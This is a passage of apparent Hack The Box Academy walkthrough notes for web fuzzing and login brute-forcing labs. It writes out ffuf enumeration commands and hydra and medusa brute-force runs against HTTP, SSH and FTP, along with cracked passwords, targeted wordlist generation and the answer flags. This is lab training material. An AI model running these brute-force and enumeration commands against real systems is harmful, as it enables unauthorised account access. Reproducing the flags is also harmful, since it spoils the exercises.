</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{bru73_f0r_c0mm0n_p455w0rd5}</p>
<h4 id="recursive-fuzzing">Recursive fuzzing</h4>
<p><strong>Try to repeat what you learned so far to find more files/directories. One of them should give you a flag. What is the content of the flag?.</strong></p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-329-1">1</a></span>
<span class="normal"><a href="#__codelineno-329-2">2</a></span>
<span class="normal"><a href="#__codelineno-329-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-329-1"><a id="__codelineno-329-1" name="__codelineno-329-1"></a><span class="go">ffuf  -recursion -recursion-depth 1 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ  -u http://$ip:$port/FUZZ -e .php </span>
</span><span id="__span-329-2"><a id="__codelineno-329-2" name="__codelineno-329-2"></a>
</span><span id="__span-329-3"><a id="__codelineno-329-3" name="__codelineno-329-3"></a><span class="gp">#</span><span class="c1">## We obtain http://$ip:$port/forum/flag.php and the flag is there. </span>
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{fuzz1n6_7h3_w3b!}</p>
<h3 id="domain-fuzzing">Domain Fuzzing</h3>
<h4 id="subdomain-fuzzing">Subdomain fuzzing</h4>
<p><strong>Try running a sub-domain fuzzing test on 'inlanefreight.com' to find a customer sub-domain portal. What is the full domain of it?.</strong></p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-330-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-330-1"><a id="__codelineno-330-1" name="__codelineno-330-1"></a><span class="go">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.inlanefreight.com/</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: customer.inlanefreight.com</p>
<h4 id="filtering-results">Filtering results</h4>
<p><strong>Try running a VHost fuzzing scan on 'academy.htb', and see what other VHosts you get. What other VHosts did you get?.</strong></p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-331-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-331-1"><a id="__codelineno-331-1" name="__codelineno-331-1"></a><span class="go">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:$port -H &#39;Host: FUZZ.academy.htb&#39; -fs 986</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: test.academy.htb</p>
<h3 id="parameter-fuzzing">Parameter fuzzing</h3>
<h4 id="parameter-fuzzing-get">Parameter fuzzing - GET</h4>
<p><strong>Using what you learned in this section, run a parameter fuzzing scan on this page. what is the parameter accepted by this webpage?.</strong></p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-332-1">1</a></span>
<span class="normal"><a href="#__codelineno-332-2">2</a></span>
<span class="normal"><a href="#__codelineno-332-3">3</a></span>
<span class="normal"><a href="#__codelineno-332-4">4</a></span>
<span class="normal"><a href="#__codelineno-332-5">5</a></span>
<span class="normal"><a href="#__codelineno-332-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-332-1"><a id="__codelineno-332-1" name="__codelineno-332-1"></a><span class="gp"># </span>We<span class="w"> </span>enumerate:
</span><span id="__span-332-2"><a id="__codelineno-332-2" name="__codelineno-332-2"></a><span class="go">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:$por/admin/admin.php?FUZZ=key -fs 798</span>
</span><span id="__span-332-3"><a id="__codelineno-332-3" name="__codelineno-332-3"></a>
</span><span id="__span-332-4"><a id="__codelineno-332-4" name="__codelineno-332-4"></a><span class="gp"># </span>And<span class="w"> </span>we<span class="w"> </span>obtain<span class="w"> </span>user.<span class="w"> </span>We<span class="w"> </span>enter<span class="w"> </span>http://admin.academy.htb:30721/admin/admin.php?user<span class="o">=</span>key<span class="w"> </span>and<span class="w"> </span>obtain<span class="w"> </span>the<span class="w"> </span>message,<span class="w"> </span>You<span class="w"> </span>don<span class="err">&#39;</span>t<span class="w"> </span>have<span class="w"> </span>access<span class="w"> </span>to<span class="w"> </span><span class="nb">read</span><span class="w"> </span>the<span class="w"> </span>flag.<span class="w"> </span>We<span class="w"> </span>enter<span class="w"> </span>http://admin.academy.htb:30721/admin/admin.php?user<span class="o">=</span>admin<span class="w"> </span>and<span class="w"> </span>obtain<span class="w"> </span>the<span class="w"> </span>message<span class="w"> </span><span class="s2">&quot;This method is deprecated&quot;</span>
</span><span id="__span-332-5"><a id="__codelineno-332-5" name="__codelineno-332-5"></a>
</span><span id="__span-332-6"><a id="__codelineno-332-6" name="__codelineno-332-6"></a><span class="go">ffuf -w  /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:$port/admin/admin.php -X POST -d &#39;FUZZ=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: user</p>
<h4 id="value-fuzzing">Value  fuzzing</h4>
<p><strong>Try to create the 'ids.txt' wordlist, identify the accepted value with a fuzzing scan, and then use it in a 'POST' request with 'curl' to collect the flag. What is the content of the flag?.</strong></p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-333-1">1</a></span>
<span class="normal"><a href="#__codelineno-333-2">2</a></span>
<span class="normal"><a href="#__codelineno-333-3">3</a></span>
<span class="normal"><a href="#__codelineno-333-4">4</a></span>
<span class="normal"><a href="#__codelineno-333-5">5</a></span>
<span class="normal"><a href="#__codelineno-333-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-333-1"><a id="__codelineno-333-1" name="__codelineno-333-1"></a><span class="gp"># </span>First<span class="w"> </span>create<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span><span class="m">1000</span><span class="w"> </span>id<span class="w"> </span>values,<span class="w"> </span>from<span class="w"> </span><span class="m">1</span><span class="w"> </span>to<span class="w"> </span><span class="m">1000</span>
</span><span id="__span-333-2"><a id="__codelineno-333-2" name="__codelineno-333-2"></a><span class="go">for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done</span>
</span><span id="__span-333-3"><a id="__codelineno-333-3" name="__codelineno-333-3"></a><span class="gp"># </span>Now,<span class="w"> </span>fuzz
</span><span id="__span-333-4"><a id="__codelineno-333-4" name="__codelineno-333-4"></a><span class="go">ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:$port/admin/admin.php -X POST -d &#39;id=FUZZ&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx</span>
</span><span id="__span-333-5"><a id="__codelineno-333-5" name="__codelineno-333-5"></a><span class="gp"># </span>it<span class="w"> </span>will<span class="w"> </span><span class="k">return</span><span class="w"> </span>the<span class="w"> </span>payload<span class="w"> </span><span class="m">73</span>.<span class="w"> </span>Now<span class="w"> </span>with<span class="w"> </span>curl:
</span><span id="__span-333-6"><a id="__codelineno-333-6" name="__codelineno-333-6"></a><span class="go">curl http://admin.academy.htb:$port/admin/admin.php -X POST -d &#39;id=73&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; </span>
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{p4r4m373r_fuzz1n6_15_k3y!}</p>
<h3 id="skills-assessment-web-fuzzing">Skills assessment - Web fuzzing</h3>
<p><strong>Run a sub-domain/vhost fuzzing scan on '*.academy.htb' for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name).</strong></p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-334-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-334-1"><a id="__codelineno-334-1" name="__codelineno-334-1"></a><span class="go">ffuf -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:$port/ -H &#39;Host: FUZZ.academy.htb&#39; -fs 985</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: test archive faculty</p>
<p><strong>Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?.</strong></p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-335-1">1</a></span>
<span class="normal"><a href="#__codelineno-335-2">2</a></span>
<span class="normal"><a href="#__codelineno-335-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-335-1"><a id="__codelineno-335-1" name="__codelineno-335-1"></a><span class="go">ffuf -w  /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://academy.htb:$port/indexFUZZ -H &#39;Host:test.academy.htb&#39;</span>
</span><span id="__span-335-2"><a id="__codelineno-335-2" name="__codelineno-335-2"></a><span class="go">ffuf -w  /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://academy.htb:$port/indexFUZZ -H &#39;Host:archive.academy.htb&#39;</span>
</span><span id="__span-335-3"><a id="__codelineno-335-3" name="__codelineno-335-3"></a><span class="go">ffuf -w  /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://academy.htb:$port/indexFUZZ -H &#39;Host:faculty.academy.htb&#39;</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: php phps php7</p>
<p>** One of the pages you will identify should say 'You don't have access!'. What is the full page URL?.**</p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-336-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-336-1"><a id="__codelineno-336-1" name="__codelineno-336-1"></a><span class="go">ffuf -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ  -u http://faculty.academy.htb:$port/FUZZ  -recursion -recursion-depth 1 -e .php,.php7,.phps -fc 403</span>
</span></code></pre></div></td></tr></table></div>
<p>Results:  http://faculty.academy.htb:PORT/courses/linux-security.php7</p>
<p>** In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?.**</p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-337-1">1</a></span>
<span class="normal"><a href="#__codelineno-337-2">2</a></span>
<span class="normal"><a href="#__codelineno-337-3">3</a></span>
<span class="normal"><a href="#__codelineno-337-4">4</a></span>
<span class="normal"><a href="#__codelineno-337-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-337-1"><a id="__codelineno-337-1" name="__codelineno-337-1"></a><span class="gp"># </span>First,<span class="w"> </span>we<span class="w"> </span>fuzz<span class="w"> </span>parameters:
</span><span id="__span-337-2"><a id="__codelineno-337-2" name="__codelineno-337-2"></a><span class="go">ffuf -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ  -u http://faculty.academy.htb:$port/courses/linux-security.php7?FUZZ=1   -fs 774</span>
</span><span id="__span-337-3"><a id="__codelineno-337-3" name="__codelineno-337-3"></a>
</span><span id="__span-337-4"><a id="__codelineno-337-4" name="__codelineno-337-4"></a><span class="gp"># </span>We<span class="w"> </span>obtain<span class="w"> </span>user.<span class="w"> </span>We<span class="w"> </span>enter<span class="w"> </span>http://faculty.academy.htb:<span class="nv">$port</span>/courses/linux-security.php7?user<span class="o">=</span>admin<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>browsers.<span class="w"> </span>When<span class="w"> </span>accessing,<span class="w"> </span>we<span class="w"> </span><span class="nb">read</span><span class="w"> </span>the<span class="w"> </span>message<span class="w"> </span><span class="s2">&quot;This method is no longer used.&quot;</span><span class="w"> </span>printed<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>screen.<span class="w"> </span>So<span class="w"> </span>we<span class="w"> </span>try<span class="w"> </span>to<span class="w"> </span>FUZZ<span class="w"> </span>the<span class="w"> </span>value<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>user<span class="w"> </span>parameter<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>POST<span class="w"> </span>method
</span><span id="__span-337-5"><a id="__codelineno-337-5" name="__codelineno-337-5"></a><span class="go">ffuf -w  /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ  -u &quot;http://faculty.academy.htb:$port/courses/linux-security.php7&quot;  -X POST -d &quot;FUZZ=key&quot; -H &#39;Content-Type: application/x-www-form-urlencoded&#39;  -fs 774 </span>
</span></code></pre></div></td></tr></table></div>
<p>Results:  user, username</p>
<p><strong>Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?.</strong></p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-338-1">1</a></span>
<span class="normal"><a href="#__codelineno-338-2">2</a></span>
<span class="normal"><a href="#__codelineno-338-3">3</a></span>
<span class="normal"><a href="#__codelineno-338-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-338-1"><a id="__codelineno-338-1" name="__codelineno-338-1"></a><span class="go">ffuf -w  /usr/share/seclists/Usernames/Names/names.txt:FUZZ  -u &quot;http://faculty.academy.htb:$port/courses/linux-security.php7&quot;  -X POST -d &quot;username=FUZZ&quot; -H &#39;Content-Type: application/x-www-form-urlencoded&#39;  -fs 781</span>
</span><span id="__span-338-2"><a id="__codelineno-338-2" name="__codelineno-338-2"></a>
</span><span id="__span-338-3"><a id="__codelineno-338-3" name="__codelineno-338-3"></a><span class="gp"># </span>This<span class="w"> </span>returns<span class="w"> </span><span class="s1">&#39;harry&#39;</span>.<span class="w"> </span>Now<span class="w"> </span>we<span class="w"> </span>curl<span class="w"> </span>that<span class="w"> </span>url
</span><span id="__span-338-4"><a id="__codelineno-338-4" name="__codelineno-338-4"></a><span class="go">curl  &quot;http://faculty.academy.htb:$port/courses/linux-security.php7&quot;  -X POST -d &quot;username=harry&quot;  </span>
</span></code></pre></div></td></tr></table></div>
<p>Results:  HTB{w3b_fuzz1n6_m4573r}</p>
<h2 id="login-brute-forcing"><a href="https://academy.hackthebox.com/module/details/57">Login Brute Forcing</a></h2>
<h3 id="brute-force-attacks">Brute Force Attacks</h3>
<p><strong>After successfully brute-forcing the PIN, what is the full flag the script returns?</strong></p>
<p>Run the provided script. Also you can do it from Burpsuite.</p>
<p>Results: HTB{Brut3_F0rc3_1s_P0w3rfu1}</p>
<p><strong>After successfully brute-forcing the target using the script, what is the full flag the script returns?</strong></p>
<p>Run the provided script. Also you can do it from Burpsuite.</p>
<p>HTB{Brut3_F0rc3_M4st3r}</p>
<h3 id="hydra">Hydra</h3>
<p><strong>Basic HTTP Authentication- After successfully brute-forcing, and then logging into the target, what is the full flag you find?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-339-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-339-1"><a id="__codelineno-339-1" name="__codelineno-339-1"></a>hydra -l basic-auth-user -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 94.237.63.111 -s 32110 http-get / 
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{th1s_1s_4_f4k3_fl4g}</p>
<p><strong>Login Forms- After successfully brute-forcing, and then logging into the target, what is the full flag you find?</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-340-1">1</a></span>
<span class="normal"><a href="#__codelineno-340-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-340-1"><a id="__codelineno-340-1" name="__codelineno-340-1"></a>hydra<span class="w"> </span>-L<span class="w"> </span>/usr/share/seclists/Usernames/top-usernames-shortlist.txt<span class="w"> </span>-P<span class="w"> </span>/usr/share/seclists/Passwords/2023-200_most_used_passwords.txt<span class="w"> </span>-f<span class="w"> </span><span class="m">94</span>.237.63.111<span class="w"> </span>-s<span class="w"> </span><span class="m">47017</span><span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/:username=^USER^&amp;password=^PASS^:F=Invalid credentials&quot;</span>
</span><span id="__span-340-2"><a id="__codelineno-340-2" name="__codelineno-340-2"></a><span class="c1"># Output: [47017][http-post-form] host: 94.237.63.111   login: admin   password: zxcvbnm</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{W3b_L0gin_Brut3F0rc3}</p>
<h3 id="medusa">Medusa</h3>
<p>What was the password for the ftpuser?</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-341-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-341-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-341-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-341-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-341-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-341-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-341-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-341-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-341-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-341-10">10</a></span>
<span class="normal"><a href="#__codelineno-341-11">11</a></span>
<span class="normal"><a href="#__codelineno-341-12">12</a></span>
<span class="normal"><a href="#__codelineno-341-13">13</a></span>
<span class="normal"><a href="#__codelineno-341-14">14</a></span>
<span class="normal"><a href="#__codelineno-341-15">15</a></span>
<span class="normal"><a href="#__codelineno-341-16">16</a></span>
<span class="normal"><a href="#__codelineno-341-17">17</a></span>
<span class="normal"><a href="#__codelineno-341-18">18</a></span>
<span class="normal"><a href="#__codelineno-341-19">19</a></span>
<span class="normal"><a href="#__codelineno-341-20">20</a></span>
<span class="normal"><a href="#__codelineno-341-21">21</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-341-1"><a id="__codelineno-341-1" name="__codelineno-341-1"></a>medusa -u sshuser -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt -M ssh -h 83.136.253.44 -n 45938 -t 3
</span><span id="__span-341-2"><a id="__codelineno-341-2" name="__codelineno-341-2"></a># Output: 2025-01-20 19:57:42 ACCOUNT FOUND: [ssh] Host: 83.136.253.44 User: sshuser Password: 1q2w3e4r5t [SUCCESS]
</span><span id="__span-341-3"><a id="__codelineno-341-3" name="__codelineno-341-3"></a>
</span><span id="__span-341-4"><a id="__codelineno-341-4" name="__codelineno-341-4"></a># Connect via ssh
</span><span id="__span-341-5"><a id="__codelineno-341-5" name="__codelineno-341-5"></a>ssh sshuser@83.136.253.44 -p 45938
</span><span id="__span-341-6"><a id="__codelineno-341-6" name="__codelineno-341-6"></a>
</span><span id="__span-341-7"><a id="__codelineno-341-7" name="__codelineno-341-7"></a># Reconnaissance
</span><span id="__span-341-8"><a id="__codelineno-341-8" name="__codelineno-341-8"></a>nmap localhost
</span><span id="__span-341-9"><a id="__codelineno-341-9" name="__codelineno-341-9"></a>
</span><span id="__span-341-10"><a id="__codelineno-341-10" name="__codelineno-341-10"></a># From the local target machine:
</span><span id="__span-341-11"><a id="__codelineno-341-11" name="__codelineno-341-11"></a>medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
</span><span id="__span-341-12"><a id="__codelineno-341-12" name="__codelineno-341-12"></a># Output: ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: qqww1122 [SUCCESS]
</span><span id="__span-341-13"><a id="__codelineno-341-13" name="__codelineno-341-13"></a>
</span><span id="__span-341-14"><a id="__codelineno-341-14" name="__codelineno-341-14"></a># From the target machine connect to FTP
</span><span id="__span-341-15"><a id="__codelineno-341-15" name="__codelineno-341-15"></a>ftp ftpuser@$ip
</span><span id="__span-341-16"><a id="__codelineno-341-16" name="__codelineno-341-16"></a># Enter password: qqww1122
</span><span id="__span-341-17"><a id="__codelineno-341-17" name="__codelineno-341-17"></a>dir 
</span><span id="__span-341-18"><a id="__codelineno-341-18" name="__codelineno-341-18"></a>get flag.txt
</span><span id="__span-341-19"><a id="__codelineno-341-19" name="__codelineno-341-19"></a>quit
</span><span id="__span-341-20"><a id="__codelineno-341-20" name="__codelineno-341-20"></a>
</span><span id="__span-341-21"><a id="__codelineno-341-21" name="__codelineno-341-21"></a>cat flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: qqww1122</p>
<p><strong>After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt?</strong></p>
<p>Results: HTB{SSH_and_FTP_Bruteforce_Success}</p>
<h3 id="custom-wordlists">Custom Wordlists</h3>
<p><strong>After successfully brute-forcing, and then logging into the target, what is the full flag you find?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-342-1">1</a></span>
<span class="normal"><a href="#__codelineno-342-2">2</a></span>
<span class="normal"><a href="#__codelineno-342-3">3</a></span>
<span class="normal"><a href="#__codelineno-342-4">4</a></span>
<span class="normal"><a href="#__codelineno-342-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-342-1"><a id="__codelineno-342-1" name="__codelineno-342-1"></a># Generate usernames
</span><span id="__span-342-2"><a id="__codelineno-342-2" name="__codelineno-342-2"></a>./username-anarchy Jane Smith &gt; jane_smith_usernames.txt
</span><span id="__span-342-3"><a id="__codelineno-342-3" name="__codelineno-342-3"></a>
</span><span id="__span-342-4"><a id="__codelineno-342-4" name="__codelineno-342-4"></a># Generate passwords
</span><span id="__span-342-5"><a id="__codelineno-342-5" name="__codelineno-342-5"></a>cupp -i 
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-343-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-343-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-343-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-343-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-343-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-343-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-343-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-343-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-343-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-343-10">10</a></span>
<span class="normal"><a href="#__codelineno-343-11">11</a></span>
<span class="normal"><a href="#__codelineno-343-12">12</a></span>
<span class="normal"><a href="#__codelineno-343-13">13</a></span>
<span class="normal"><a href="#__codelineno-343-14">14</a></span>
<span class="normal"><a href="#__codelineno-343-15">15</a></span>
<span class="normal"><a href="#__codelineno-343-16">16</a></span>
<span class="normal"><a href="#__codelineno-343-17">17</a></span>
<span class="normal"><a href="#__codelineno-343-18">18</a></span>
<span class="normal"><a href="#__codelineno-343-19">19</a></span>
<span class="normal"><a href="#__codelineno-343-20">20</a></span>
<span class="normal"><a href="#__codelineno-343-21">21</a></span>
<span class="normal"><a href="#__codelineno-343-22">22</a></span>
<span class="normal"><a href="#__codelineno-343-23">23</a></span>
<span class="normal"><a href="#__codelineno-343-24">24</a></span>
<span class="normal"><a href="#__codelineno-343-25">25</a></span>
<span class="normal"><a href="#__codelineno-343-26">26</a></span>
<span class="normal"><a href="#__codelineno-343-27">27</a></span>
<span class="normal"><a href="#__codelineno-343-28">28</a></span>
<span class="normal"><a href="#__codelineno-343-29">29</a></span>
<span class="normal"><a href="#__codelineno-343-30">30</a></span>
<span class="normal"><a href="#__codelineno-343-31">31</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-343-1"><a id="__codelineno-343-1" name="__codelineno-343-1"></a>Output
</span><span id="__span-343-2"><a id="__codelineno-343-2" name="__codelineno-343-2"></a>&gt; First Name: Jane
</span><span id="__span-343-3"><a id="__codelineno-343-3" name="__codelineno-343-3"></a>&gt; Surname: Smith
</span><span id="__span-343-4"><a id="__codelineno-343-4" name="__codelineno-343-4"></a>&gt; Nickname: Janey
</span><span id="__span-343-5"><a id="__codelineno-343-5" name="__codelineno-343-5"></a>&gt; Birthdate (DDMMYYYY): 11121990
</span><span id="__span-343-6"><a id="__codelineno-343-6" name="__codelineno-343-6"></a>
</span><span id="__span-343-7"><a id="__codelineno-343-7" name="__codelineno-343-7"></a>
</span><span id="__span-343-8"><a id="__codelineno-343-8" name="__codelineno-343-8"></a>&gt; Partners) name: Jim
</span><span id="__span-343-9"><a id="__codelineno-343-9" name="__codelineno-343-9"></a>&gt; Partners) nickname: Jimbo
</span><span id="__span-343-10"><a id="__codelineno-343-10" name="__codelineno-343-10"></a>&gt; Partners) birthdate (DDMMYYYY): 12121990
</span><span id="__span-343-11"><a id="__codelineno-343-11" name="__codelineno-343-11"></a>
</span><span id="__span-343-12"><a id="__codelineno-343-12" name="__codelineno-343-12"></a>
</span><span id="__span-343-13"><a id="__codelineno-343-13" name="__codelineno-343-13"></a>&gt; Child&#39;s name: 
</span><span id="__span-343-14"><a id="__codelineno-343-14" name="__codelineno-343-14"></a>&gt; Child&#39;s nickname: 
</span><span id="__span-343-15"><a id="__codelineno-343-15" name="__codelineno-343-15"></a>&gt; Child&#39;s birthdate (DDMMYYYY): 
</span><span id="__span-343-16"><a id="__codelineno-343-16" name="__codelineno-343-16"></a>
</span><span id="__span-343-17"><a id="__codelineno-343-17" name="__codelineno-343-17"></a>
</span><span id="__span-343-18"><a id="__codelineno-343-18" name="__codelineno-343-18"></a>&gt; Pet&#39;s name: Spot
</span><span id="__span-343-19"><a id="__codelineno-343-19" name="__codelineno-343-19"></a>&gt; Company name: AHI
</span><span id="__span-343-20"><a id="__codelineno-343-20" name="__codelineno-343-20"></a>
</span><span id="__span-343-21"><a id="__codelineno-343-21" name="__codelineno-343-21"></a>
</span><span id="__span-343-22"><a id="__codelineno-343-22" name="__codelineno-343-22"></a>&gt; Do you want to add some key words about the victim? Y/[N]: y
</span><span id="__span-343-23"><a id="__codelineno-343-23" name="__codelineno-343-23"></a>&gt; Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,juice,black], spaces will be removed: hacker,blue
</span><span id="__span-343-24"><a id="__codelineno-343-24" name="__codelineno-343-24"></a>&gt; Do you want to add special chars at the end of words? Y/[N]: y
</span><span id="__span-343-25"><a id="__codelineno-343-25" name="__codelineno-343-25"></a>&gt; Do you want to add some random numbers at the end of words? Y/[N]:y
</span><span id="__span-343-26"><a id="__codelineno-343-26" name="__codelineno-343-26"></a>&gt; Leet mode? (i.e. leet = 1337) Y/[N]: y
</span><span id="__span-343-27"><a id="__codelineno-343-27" name="__codelineno-343-27"></a>
</span><span id="__span-343-28"><a id="__codelineno-343-28" name="__codelineno-343-28"></a>[+] Now making a dictionary...
</span><span id="__span-343-29"><a id="__codelineno-343-29" name="__codelineno-343-29"></a>[+] Sorting list and removing duplicates...
</span><span id="__span-343-30"><a id="__codelineno-343-30" name="__codelineno-343-30"></a>[+] Saving dictionary to jane.txt, counting 52058 words.
</span><span id="__span-343-31"><a id="__codelineno-343-31" name="__codelineno-343-31"></a>[+] Now load your pistolero with jane.txt and shoot! Good luck!
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-344-1">1</a></span>
<span class="normal"><a href="#__codelineno-344-2">2</a></span>
<span class="normal"><a href="#__codelineno-344-3">3</a></span>
<span class="normal"><a href="#__codelineno-344-4">4</a></span>
<span class="normal"><a href="#__codelineno-344-5">5</a></span>
<span class="normal"><a href="#__codelineno-344-6">6</a></span>
<span class="normal"><a href="#__codelineno-344-7">7</a></span>
<span class="normal"><a href="#__codelineno-344-8">8</a></span>
<span class="normal"><a href="#__codelineno-344-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-344-1"><a id="__codelineno-344-1" name="__codelineno-344-1"></a># Filter passwords
</span><span id="__span-344-2"><a id="__codelineno-344-2" name="__codelineno-344-2"></a>grep -E &#39;^.{6,}$&#39; jane.txt | grep -E &#39;[A-Z]&#39; | grep -E &#39;[a-z]&#39; | grep -E &#39;[0-9]&#39; | grep -E &#39;([!@#$%^&amp;*].*){2,}&#39; &gt; dictionary-filtered.txt
</span><span id="__span-344-3"><a id="__codelineno-344-3" name="__codelineno-344-3"></a>
</span><span id="__span-344-4"><a id="__codelineno-344-4" name="__codelineno-344-4"></a># Launch hydra attack:
</span><span id="__span-344-5"><a id="__codelineno-344-5" name="__codelineno-344-5"></a>hydra -L jane_smith_usernames.txt -P dictionary-filtered.txt 94.237.50.7 -s 32234 -f http-post-form &quot;/:username=^USER^&amp;password=^PASS^:Invalid credentials&quot;
</span><span id="__span-344-6"><a id="__codelineno-344-6" name="__codelineno-344-6"></a>
</span><span id="__span-344-7"><a id="__codelineno-344-7" name="__codelineno-344-7"></a># Output: [32234][http-post-form] host: 94.237.50.7   login: jane   password: 3n4J!!
</span><span id="__span-344-8"><a id="__codelineno-344-8" name="__codelineno-344-8"></a>
